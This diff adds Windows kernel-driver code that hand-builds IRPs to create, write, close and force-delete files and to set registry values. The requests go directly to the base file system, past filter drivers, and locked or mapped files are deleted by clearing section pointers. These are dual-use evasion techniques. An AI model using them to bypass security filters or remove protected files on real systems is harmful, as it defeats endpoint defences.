+    irp->Flags = IRP_SYNCHRONOUS_API | IRP_WRITE_OPERATION;          //IRPD′2ù×÷
+    irp->RequestorMode = KernelMode;
+    irp->UserIosb = pIoStatusBlock;
+    irp->UserEvent = &event;
+    irp->Tail.Overlay.Thread = (PETHREAD)KeGetCurrentThread();
+    irp->Tail.Overlay.OriginalFileObject = pFileObject;
+    irpSp = IoGetNextIrpStackLocation(irp);
+    irpSp->MajorFunction = IRP_MJ_WRITE;
+    irpSp->MinorFunction = IRP_MN_NORMAL;
+    irpSp->DeviceObject = deviceObject;
+    irpSp->FileObject = pFileObject;
+    irpSp->Parameters.Write.Length = aalen;
+    irpSp->Parameters.Write.ByteOffset = *ByteOffset;
+    KeInitializeEvent(&event, SynchronizationEvent, FALSE);
+    IoSetCompletionRoutine(irp, IoCompletionRoutineEx, NULL, TRUE, TRUE, TRUE);
+    polddev = IoGetBaseFileSystemDeviceObject(pFileObject);
+    status = IoCallDriver(polddev, irp);
+
+    if(status == STATUS_PENDING)
+        status = KeWaitForSingleObject(&event, Executive, KernelMode, TRUE, NULL);
+
+    status = pIoStatusBlock->Status;
+#ifdef DBG
+    LOG(LOGFL_INFO, ("[IrpFileWrite] write file len:%d  file status:%x\n", pIoStatusBlock->Information, pIoStatusBlock->Status));
+#endif
+    return status;
+}
+
+NTSTATUS GetDriveObject(PUNICODE_STRING pDriveName, PDEVICE_OBJECT * DeviceObject, PDEVICE_OBJECT * ReadDevice)
+{
+
+    NTSTATUS status;
+    OBJECT_ATTRIBUTES objectAttributes;
+    HANDLE DeviceHandle = NULL;
+    IO_STATUS_BLOCK ioStatus;
+    PFILE_OBJECT pFileObject;
+
+    if(pDriveName == NULL || DeviceObject == NULL || ReadDevice == NULL)return STATUS_INVALID_PARAMETER;
+    //  \\??\\C:
+    InitializeObjectAttributes(&objectAttributes, pDriveName, OBJ_CASE_INSENSITIVE, NULL, NULL);
+    status = IoCreateFile(&DeviceHandle, SYNCHRONIZE | FILE_ANY_ACCESS, &objectAttributes, &ioStatus, NULL, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT | FILE_DIRECTORY_FILE, NULL, 0, CreateFileTypeNone, NULL, IO_NO_PARAMETER_CHECKING);
+
+    if(!NT_SUCCESS(status)) {
+        DbgPrint("[GetDriveObject] call IoCreateFile ntStatus:%x  pDriveName￡o%wZ", status, pDriveName);
+        return status;
+    }
+    status = ObReferenceObjectByHandle(DeviceHandle, FILE_READ_DATA, *IoFileObjectType, KernelMode, (PVOID*)&pFileObject, NULL);
+
+    if(!NT_SUCCESS(status)) {
+        DbgPrint("[GetDriveObject] call ObReferenceObjectByHandle ntStatus:%x\n", status);
+        ZwClose(DeviceHandle);
+        return status;
+    }
+
+    if(pFileObject->Vpb == 0 || pFileObject->Vpb->RealDevice == NULL) {
+        ObDereferenceObject(pFileObject);
+        ZwClose(DeviceHandle);
+        return STATUS_UNSUCCESSFUL;
+    }
+    //polddev = ;
+    *DeviceObject = pFileObject->Vpb->DeviceObject;
+    *ReadDevice = pFileObject->Vpb->RealDevice;
+    ObDereferenceObject(pFileObject);
+    ZwClose(DeviceHandle);
+    return STATUS_SUCCESS;
+}
+
+
+NTSTATUS IrpClose(PFILE_OBJECT  pFileObject)
+{
+    //
+    PDEVICE_OBJECT DeviceObject;
+    NTSTATUS ntStatus;
+    IO_STATUS_BLOCK  IoStatusBlock;
+    PIRP pIrp;
+    KEVENT kEvent;
+    PIO_STACK_LOCATION IrpSp;
+
+    if(pFileObject == NULL)return STATUS_INVALID_PARAMETER;
+
+    //DeviceObject = IoGetRelatedDeviceObject(pFileObject);
+
+    DeviceObject = IoGetBaseFileSystemDeviceObject(pFileObject);
+
+    if(DeviceObject == NULL || DeviceObject->StackSize <= 0)return STATUS_UNSUCCESSFUL;
+
+    //
+    pIrp = IoAllocateIrp(DeviceObject->StackSize, FALSE);
+
+    if(pIrp == NULL)return STATUS_INSUFFICIENT_RESOURCES;
+
+    KeInitializeEvent(&kEvent, SynchronizationEvent, FALSE);
+    pIrp->UserEvent = &kEvent;
+    pIrp->UserIosb = &IoStatusBlock;
+    pIrp->RequestorMode = KernelMode;
+    pIrp->Flags = IRP_CLOSE_OPERATION | IRP_SYNCHRONOUS_API;
+    pIrp->Tail.Overlay.Thread = PsGetCurrentThread();
+    pIrp->Tail.Overlay.OriginalFileObject = pFileObject;
+    IrpSp = IoGetNextIrpStackLocation(pIrp);
+    IrpSp->MajorFunction = IRP_MJ_CLEANUP;
+    IrpSp->FileObject = pFileObject;
+    ntStatus = IoCallDriver(DeviceObject, pIrp);
+
+    if(ntStatus == STATUS_PENDING)
+        KeWaitForSingleObject(&kEvent, Executive, KernelMode, FALSE, NULL);
+
+    ntStatus = IoStatusBlock.Status;
+
+    if(!NT_SUCCESS(ntStatus)) {
+        IoFreeIrp(pIrp);
+        return ntStatus;
+    }
+
+    KeClearEvent(&kEvent);
+    IoReuseIrp(pIrp, STATUS_SUCCESS);
+    pIrp->UserEvent = &kEvent;
+    pIrp->UserIosb = &IoStatusBlock;
+    pIrp->Tail.Overlay.OriginalFileObject = pFileObject;
+    pIrp->Tail.Overlay.Thread = PsGetCurrentThread();
+    pIrp->AssociatedIrp.SystemBuffer = (PVOID)NULL;
+    pIrp->Flags = IRP_CLOSE_OPERATION | IRP_SYNCHRONOUS_API;
+    IrpSp = IoGetNextIrpStackLocation(pIrp);
+    IrpSp->MajorFunction = IRP_MJ_CLOSE;
+    IrpSp->FileObject = pFileObject;
+
+    if(pFileObject->Vpb && !(pFileObject->Flags & FO_DIRECT_DEVICE_OPEN)) {
+        InterlockedDecrement((volatile LONG*)&pFileObject->Vpb->ReferenceCount);
+        pFileObject->Flags |= FO_FILE_OPEN_CANCELLED;
+    }
+
+    ntStatus = IoCallDriver(DeviceObject, pIrp);
+
+    if(ntStatus == STATUS_PENDING)
+        KeWaitForSingleObject(&kEvent, Executive, KernelMode, FALSE, NULL);
+
+    IoFreeIrp(pIrp);
+    ntStatus = IoStatusBlock.Status;
+    return ntStatus;
+}
+
+
+NTSTATUS IoCompletionRoutineEx(PDEVICE_OBJECT  DeviceObject, PIRP  Irp, PVOID  Context)
+{
+    UNREFERENCED_PARAMETER(Context);
+    UNREFERENCED_PARAMETER(DeviceObject);
+    *Irp->UserIosb = Irp->IoStatus;
+
+    if(Irp->UserEvent)
+        KeSetEvent(Irp->UserEvent, IO_NO_INCREMENT, 0);
+
+    if(Irp->MdlAddress) {
+        IoFreeMdl(Irp->MdlAddress);
+        Irp->MdlAddress = NULL;
+    }
+
+    IoFreeIrp(Irp);
+    return STATUS_MORE_PROCESSING_REQUIRED;
+}
+
+
+
+
+NTSTATUS IrpCreateFile(PUNICODE_STRING pFilePath, ACCESS_MASK DesiredAccess, PIO_STATUS_BLOCK pIoStatusBlock, PFILE_OBJECT * pFileObject)
+{
+
+    NTSTATUS ntStatus = -1;
+    PIRP pIrp = NULL;
+    KEVENT kEvent = {0};
+    static ACCESS_STATE AccessState = {0};
+    static AUX_ACCESS_DATA AuxData = {0};
+    OBJECT_ATTRIBUTES ObjectAttributes = {0};
+    PFILE_OBJECT  pNewFileObject;
+    IO_SECURITY_CONTEXT SecurityContext;
+    PIO_STACK_LOCATION IrpSp;
+    PDEVICE_OBJECT pDeviceObject = NULL;
+    PDEVICE_OBJECT pReadDevice = NULL;
+    PDEVICE_OBJECT polddev = NULL;
+    UNICODE_STRING DriveName;
+    wchar_t* pFileNameBuf = NULL;
+    static wchar_t szFilePath[MAX_PATH] = { 0 };
+#define SYMBOLICLINKLENG            6           //  \\??\\c:            \\windows\\notepad.exe  
+
+    //参数效验
+    if(pFilePath == NULL || pIoStatusBlock == NULL || pFileObject == NULL || pFilePath->Length <= SYMBOLICLINKLENG)return STATUS_INVALID_PARAMETER;
+
+    //pFilePath  \\??\\c:\\456\\123.sys
+    RtlZeroMemory(szFilePath, sizeof(szFilePath));
+    RtlCopyMemory(szFilePath, pFilePath->Buffer, (SYMBOLICLINKLENG + 1)*sizeof(wchar_t));
+    RtlInitUnicodeString(&DriveName, szFilePath); //DriveName=\\??\\c:\
+
+    ntStatus = GetDriveObject(&DriveName, &pDeviceObject, &pReadDevice);
+
+    if(!NT_SUCCESS(ntStatus)) {
+        DbgPrint("[IrpCreateFile] GetDriveObjectA ntStatus:%x pDeviceObject:%p pReadDevice:%p", ntStatus, pDeviceObject, pReadDevice);
+        return ntStatus;
+    }
+
+    RtlZeroMemory(szFilePath, sizeof(szFilePath));
+    RtlCopyMemory(szFilePath, &pFilePath->Buffer[SYMBOLICLINKLENG], pFilePath->Length - SYMBOLICLINKLENG);
+    RtlInitUnicodeString(&DriveName, szFilePath);
+    pFileNameBuf = (WCHAR*)kmalloc(DriveName.MaximumLength);
+
+    if(pFileNameBuf == NULL)return STATUS_UNSUCCESSFUL;
+
+    RtlZeroMemory(pFileNameBuf, DriveName.MaximumLength);
+    RtlCopyMemory(pFileNameBuf, DriveName.Buffer, DriveName.Length);
+
+    //
+    if(pDeviceObject == NULL || pReadDevice == NULL || pDeviceObject->StackSize <= 0)return STATUS_UNSUCCESSFUL;
+
+    InitializeObjectAttributes(&ObjectAttributes, NULL, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, 0, NULL);
+    ntStatus = ObCreateObject(KernelMode, *IoFileObjectType, &ObjectAttributes, \
+                              KernelMode, NULL, sizeof(FILE_OBJECT), 0, 0, (PVOID*)&pNewFileObject);
+
+
+    if(!NT_SUCCESS(ntStatus)) {
+        DbgPrint("[IrpCreateFile] call ObCreateObject ntStatus:%x", ntStatus);
+        return ntStatus;
+
+    }
+
+    pIrp = IoAllocateIrp(pDeviceObject->StackSize, FALSE);
+
+    if(pIrp == NULL) {
+        ObDereferenceObject(pNewFileObject);
+        return STATUS_INSUFFICIENT_RESOURCES;
+    }
+
+    KeInitializeEvent(&kEvent, SynchronizationEvent, FALSE);
+    RtlZeroMemory(pNewFileObject, sizeof(FILE_OBJECT));
+    pNewFileObject->Type = IO_TYPE_FILE;
+    pNewFileObject->Size = sizeof(FILE_OBJECT);
+    pNewFileObject->DeviceObject = pReadDevice;
+    pNewFileObject->Flags = FO_SYNCHRONOUS_IO;
+    RtlInitUnicodeString(&pNewFileObject->FileName, pFileNameBuf);       // \\??\\c:\\
+    KeInitializeEvent(&pNewFileObject->Lock, SynchronizationEvent, FALSE);
+    KeInitializeEvent(&pNewFileObject->Event, NotificationEvent, FALSE);
+    ntStatus = SeCreateAccessState(&AccessState, &AuxData, FILE_ALL_ACCESS, IoGetFileObjectGenericMapping());
+    if(!NT_SUCCESS(ntStatus)) {
+        IoFreeIrp(pIrp);
+        ObDereferenceObject(pNewFileObject);
+        return ntStatus;
+    }
+
+    SecurityContext.SecurityQos = NULL;
+    SecurityContext.AccessState = &AccessState;
+    SecurityContext.DesiredAccess = DesiredAccess; //FILE_ALL_ACCESS;       // DELETE
+    SecurityContext.FullCreateOptions = 0;
+    pIrp->MdlAddress = NULL;
+    pIrp->AssociatedIrp.SystemBuffer = NULL;
+    pIrp->Flags = IRP_CREATE_OPERATION | IRP_SYNCHRONOUS_API;
+    pIrp->RequestorMode = KernelMode;
+    pIrp->UserIosb = pIoStatusBlock;
+    pIrp->UserEvent = &kEvent;
+    pIrp->PendingReturned = FALSE;
+    pIrp->Cancel = FALSE;
+    pIrp->CancelRoutine = NULL;
+    pIrp->Tail.Overlay.Thread = PsGetCurrentThread();
+    pIrp->Tail.Overlay.AuxiliaryBuffer = NULL;
+    pIrp->Tail.Overlay.OriginalFileObject = pNewFileObject;
+    IrpSp = IoGetNextIrpStackLocation(pIrp);
+    IrpSp->MajorFunction = IRP_MJ_CREATE;
+    IrpSp->DeviceObject = pDeviceObject;
+    IrpSp->FileObject = pNewFileObject;
+    IrpSp->Parameters.Create.SecurityContext = &SecurityContext;
+    IrpSp->Parameters.Create.Options = (FILE_OPEN_IF << 24) | 0;
+    IrpSp->Parameters.Create.FileAttributes = (USHORT)FILE_ATTRIBUTE_NORMAL;
+    IrpSp->Parameters.Create.ShareAccess = (USHORT)FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE;
+    IrpSp->Parameters.Create.EaLength = 0;
+    IoSetCompletionRoutine(pIrp, IoCompletionRoutineEx, 0, TRUE, TRUE, TRUE);
+    polddev = IoGetBaseFileSystemDeviceObject(pNewFileObject);
+    ntStatus = IoCallDriver(polddev, pIrp);
+    //     DbgPrint("polddev:%p", polddev);
+    //
+    if(polddev) {
+        //DbgPrint("[irpCreate] polddev:%p  drivename:%wZ", polddev, &polddev->DriverObject->DriverName);
+    }
+    //    ntStatus = MyIoCallDriver(pDeviceObject, pIrp);
+    if(ntStatus == STATUS_PENDING)  {
+        KeWaitForSingleObject(&kEvent, Executive, KernelMode, TRUE, 0);
+    }
+
+    ntStatus = pIoStatusBlock->Status;
+
+    if(!NT_SUCCESS(ntStatus)) {
+        pNewFileObject->DeviceObject = NULL;
+        ObDereferenceObject(pNewFileObject);
+    } else {
+
+        InterlockedIncrement(&pNewFileObject->DeviceObject->ReferenceCount);
+        if(pNewFileObject->Vpb) {
+            InterlockedIncrement((volatile LONG *)&pNewFileObject->Vpb->ReferenceCount);
+
+        }
+        *pFileObject = pNewFileObject;
+        //ObDereferenceObject(CreateFileObject);
+    }
+
+    return ntStatus;
+}
+
+
+void ZwDeleteFileFolder(WCHAR *wsFileName)
+{
+    NTSTATUS st;
+    OBJECT_ATTRIBUTES ObjectAttributes;
+    UNICODE_STRING UniFileName;
+    //
+    RtlInitUnicodeString(&UniFileName, wsFileName);
+    //
+    InitializeObjectAttributes(&ObjectAttributes,
+                               &UniFileName,
+                               OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
+                               NULL,
+                               NULL);
+    st = ZwDeleteFile(&ObjectAttributes);
+
+}
+
+
+//
+NTSTATUS IrpDeleteFileForce(PFILE_OBJECT pFileObject)
+{
+
+    NTSTATUS                status;
+    PIRP                    pIrp;
+    PIO_STACK_LOCATION      irpSp;
+    PDEVICE_OBJECT          DeviceObject;
+    IO_STATUS_BLOCK         IoStatusBlock;
+    KEVENT                  SycEvent;
+    PVOID pImageSectionObject = NULL;
+    PVOID pDataSectionObject = NULL;
+    PVOID pSharedCacheMap = NULL;
+    PSECTION_OBJECT_POINTERS        pSectionObjectPointer;
+    FILE_DISPOSITION_INFORMATION    FileInformationDelete;
+    static FILE_BASIC_INFORMATION   FileInformationAttribute;
+
+
+    if (pFileObject == NULL)return STATUS_INVALID_PARAMETER;
+
+
+    memset(&FileInformationAttribute, 0, sizeof(FILE_BASIC_INFORMATION));
+    FileInformationAttribute.FileAttributes = FILE_ATTRIBUTE_NORMAL;
+    status = irpSetFileAttributes(pFileObject, &IoStatusBlock, &FileInformationAttribute, sizeof(FILE_BASIC_INFORMATION), FileBasicInformation, TRUE);
+    if (!NT_SUCCESS(status))return status;
+
+
+
+    DeviceObject = IoGetRelatedDeviceObject(pFileObject);
+    // DeviceObject = IoGetBaseFileSystemDeviceObject(pFileObject);
+    if (DeviceObject == NULL || DeviceObject->StackSize <= 0)return STATUS_UNSUCCESSFUL;
+
+    //
+    pIrp = IoAllocateIrp(DeviceObject->StackSize, TRUE);
+    if (pIrp == NULL)return STATUS_UNSUCCESSFUL;
+
+    //
+    KeInitializeEvent(&SycEvent, SynchronizationEvent, FALSE);
+
+    //
+    FileInformationDelete.DeleteFile = TRUE;
+
+    //
+    pIrp->AssociatedIrp.SystemBuffer = &FileInformationDelete;
+    pIrp->UserEvent = &SycEvent;
+    pIrp->UserIosb = &IoStatusBlock;
+    pIrp->Tail.Overlay.OriginalFileObject = pFileObject;
+    pIrp->Tail.Overlay.Thread = (PETHREAD)KeGetCurrentThread();
+    pIrp->RequestorMode = KernelMode;
+
+    //
+    irpSp = IoGetNextIrpStackLocation(pIrp);
+    irpSp->MajorFunction = IRP_MJ_SET_INFORMATION;
+    irpSp->DeviceObject = DeviceObject;
+    irpSp->FileObject = pFileObject;
+    irpSp->Parameters.SetFile.Length = sizeof(FILE_DISPOSITION_INFORMATION);
+    irpSp->Parameters.SetFile.FileInformationClass = FileDispositionInformation;
+    irpSp->Parameters.SetFile.FileObject = pFileObject;
+
+    //
+    IoSetCompletionRoutine(pIrp, IoCompletionRoutineEx, NULL, TRUE, TRUE, TRUE);
+
+
+    //
+    if (pFileObject->SectionObjectPointer) {
+        //一个空值表明，可执行图像目前不在内存中
+        //一个空值表示数据流当前不在内存??
+        //空值的数据流是
+
+        pImageSectionObject = pFileObject->SectionObjectPointer->ImageSectionObject;
+        pDataSectionObject = pFileObject->SectionObjectPointer->DataSectionObject;
+        pSharedCacheMap = pFileObject->SectionObjectPointer->SharedCacheMap;
+
+        pFileObject->SectionObjectPointer->ImageSectionObject = NULL;
+        pFileObject->SectionObjectPointer->DataSectionObject = NULL;
+        pFileObject->SectionObjectPointer->SharedCacheMap = NULL;
+    }
+
+
+    //
+    status = IoCallDriver(DeviceObject, pIrp);
+    if (status == STATUS_PENDING)
+        KeWaitForSingleObject(&SycEvent, Executive, KernelMode, TRUE, NULL);
+    status = IoStatusBlock.Status;
+
+    //
+    if (pFileObject->SectionObjectPointer) {
+        pFileObject->SectionObjectPointer->ImageSectionObject = pImageSectionObject;
+        pFileObject->SectionObjectPointer->DataSectionObject = pDataSectionObject;
+        pFileObject->SectionObjectPointer->SharedCacheMap = pSharedCacheMap;
+    }
+
+    return status;
+}
+
+
+NTSTATUS irpSetFileAttributes(PFILE_OBJECT pFileObject, PIO_STATUS_BLOCK  pIoStatusBlock, PVOID pFileInformation, ULONG FileInformationLength, FILE_INFORMATION_CLASS  FileInformationClass, BOOLEAN  ReplaceIfExists)
+{
+
+
+    NTSTATUS                ntStatus = STATUS_SUCCESS;
+    PDEVICE_OBJECT          DeviceObject;
+    PIRP                    Irp;
+    KEVENT                  SycEvent;
+    PIO_STACK_LOCATION      irpSp;
+
+    if (pFileObject == NULL || pIoStatusBlock == NULL || pFileInformation == NULL || FileInformationLength <= 0)return STATUS_INVALID_PARAMETER;
+    //DeviceObject = IoGetRelatedDeviceObject(pFileObject);
+    DeviceObject = IoGetBaseFileSystemDeviceObject(pFileObject);
+    if (DeviceObject == NULL || DeviceObject->StackSize <= 0)return STATUS_UNSUCCESSFUL;
+    Irp = IoAllocateIrp(DeviceObject->StackSize, TRUE);
+    if (Irp == NULL) {
+        //ObDereferenceObject(pFileObject);
+        return STATUS_UNSUCCESSFUL;
+    }
+    KeInitializeEvent(&SycEvent, SynchronizationEvent, FALSE);
+    Irp->AssociatedIrp.SystemBuffer = pFileInformation;
+    Irp->UserEvent = &SycEvent;
+    Irp->UserIosb = pIoStatusBlock;
+    Irp->Tail.Overlay.OriginalFileObject = pFileObject;
+    Irp->Tail.Overlay.Thread = (PETHREAD)KeGetCurrentThread();
+    Irp->RequestorMode = KernelMode;
+    irpSp = IoGetNextIrpStackLocation(Irp);
+    irpSp->MajorFunction = IRP_MJ_SET_INFORMATION;
+    irpSp->DeviceObject = DeviceObject;
+    irpSp->FileObject = pFileObject;
+    irpSp->Parameters.SetFile.ReplaceIfExists = ReplaceIfExists;         //是否替换
+    irpSp->Parameters.SetFile.Length = FileInformationLength;                //长度
+    irpSp->Parameters.SetFile.FileInformationClass = FileInformationClass;   //类型
+    irpSp->Parameters.SetFile.FileObject = pFileObject;
+    IoSetCompletionRoutine(Irp, IoCompletionRoutineEx, NULL, TRUE, TRUE, TRUE);
+    ntStatus = IoCallDriver(DeviceObject, Irp);
+    if (ntStatus == STATUS_PENDING)
+        KeWaitForSingleObject(&SycEvent, Executive, KernelMode, TRUE, NULL);
+    ntStatus = pIoStatusBlock->Status;
+    //ObDereferenceObject(pFileObject);
+    return ntStatus;
+
+}
+   
+VOID SetRegKeyValue(WCHAR*        pPathKey,WCHAR* KeyName,WCHAR* strValue,ULONG uType){
+    UNICODE_STRING RegUnicodeString;
+    HANDLE hRegister;
+	UNICODE_STRING ValueName;
+	OBJECT_ATTRIBUTES objectAttributes;
+	NTSTATUS status;
+    //初始化UNICODE_STRING字符串
+    RtlInitUnicodeString( &RegUnicodeString,pPathKey);
+    //初始化objectAttributes
+    InitializeObjectAttributes(&objectAttributes,&RegUnicodeString,OBJ_CASE_INSENSITIVE,NULL, NULL );
+    //打开注册表
+    status = ZwOpenKey( &hRegister,KEY_ALL_ACCESS,&objectAttributes);
+    if (!NT_SUCCESS(status))
+    {   	
+        KdPrint("[SetRegKeyValue] Open register is not successfully ",status);
+    }
+   RtlInitUnicodeString( &ValueName, KeyName);
+    //设置REG_SZ子键
+    ZwSetValueKey(hRegister,&ValueName,0,uType,strValue,wcslen(strValue)*2+2);
+    ZwClose(hRegister);
+}
 
 
 /* EOF */
